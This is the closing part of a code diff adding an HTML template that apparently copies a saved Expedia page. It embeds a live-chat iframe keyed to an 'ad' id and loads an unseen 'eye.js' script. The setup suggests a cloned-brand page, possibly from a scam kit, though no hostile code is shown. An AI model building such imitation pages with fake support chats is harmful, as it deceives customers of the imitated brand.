+            class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Плохой перевод" aria-label="Плохой перевод"
+            aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24"
+                focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                <path
+                  d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z">
+                </path>
+              </svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24"
+                focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                <path
+                  d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z">
+                </path>
+              </svg></span></button></div>
+      </div>
+      <div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce">
+        <form id="goog-gt-votingForm" action="https://translate.googleapis.com/translate_voting?client=te_lib"
+          method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl"
+            id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input
+            type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans"
+            id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe
+          name="votingFrame" frameborder="0" src="./expedia_files/saved_resource.html"></iframe>
+      </div>
+    </div>
+  </div>
+
+  <div class="
+  chatra--webkit
+  chatra--style-round
+  chatra--side-bottom
+  chatra--pos-right
+  chatra--visible
+  chatra--expanded
+  chatra--fast-toggle
+" id="chatra" data-turbolinks-permanent="" style="
+  width: 380px;
+  height: 600px;
+  transform: none;
+  z-index: 2147483647;
+  display: none;
+">
+   <div id="chatra__iframe-wrapper">
+     <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+       src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+   </div>
+ </div>
+ <div class="support-circle"
+   onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+
+ <script>
+   const adId = "<%=ad.id%>"
+ </script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+ <script src="/js/eye.js" defer></script>
+
+
+
+</body>
+
+</html>
